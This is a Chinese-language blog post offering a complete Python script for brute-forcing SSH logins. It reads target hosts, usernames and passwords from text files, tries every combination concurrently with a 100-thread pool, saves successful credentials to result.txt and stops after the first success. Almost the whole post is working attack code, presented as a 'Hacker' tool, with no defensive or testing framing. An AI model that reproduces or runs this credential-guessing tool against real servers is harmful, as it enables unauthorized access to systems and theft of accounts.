title: Python SSH爆破以及Python3线程池控制线程数
date: 2018-01-13 06:37:26
update: ""
author: me
tags:
- Python
- Hacker
categories:
- Python
topic: ""
cover: ""
draft: false
preview: ""
top: false
type: ""
hide: false
config: null


---



源自一个朋友的要求，他的要求是只爆破一个ip，结果出来后就停止，如果是爆破多个，完全没必要停止，等他跑完就好

<!--more-->

```python
#!usr/bin/env python
#!coding=utf-8

__author__='Akkuman'
'''
SSH爆破，由于多线程的问题，我不知道怎么做可以出现结果马上停止（会查的，有更好的方法再改）
现在我的方法是定义了一个全局的信号finish_flag，然后每个线程检查这个信号
线程池用的concurrent.futures.ThreadPoolExecutor，是Py3的特性，py2需要安装其他的包
成功结果写到了result.txt，可以通过检查目录下的result.txt文件查看结果
'''

import paramiko
from concurrent.futures import ThreadPoolExecutor
import sys

finish_flag = False

def connect(host,user,pwd):
    global finish_flag
    if finish_flag:
        sys.exit()
    try:
        ssh=paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=host,username=user,password=pwd)
        print ("[-]Login Succ u:%s p:%s h:%s"%(user,pwd,host))
        with open('result.txt','a+') as f:
            f.write("h:%s u:%s p:%s\n"%(host,user,pwd))
        finish_flag = True
    except paramiko.ssh_exception.SSHException as err:
        print("[x]Login Fail u:%s p:%s"%(user,pwd))
    finally:
        ssh.close()
        return

# 取得一个hostip,username,password
def getInfo():
    # 遍历ip
    with open('host.txt') as hosts:
        for host in hosts:
            hostip = host.strip()
            print("[x]Target:"+host)
            # 遍历用户名
            with open('user.txt') as users:
                for user in users:
                    username = user.strip()
                    # 遍历密码
                    with open('pwd.txt') as pwds:
                        for pwd in pwds:
                            password = pwd.strip()
                            yield hostip,username,password


def main():
    paramiko.util.log_to_file("filename.log") 
    info = getInfo()
    # 最大线程数
    max_thread_num = 100
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for host,user,pwd in info:
        future = executor.submit(connect,host,user,pwd)

if __name__ == '__main__':
    main()
```
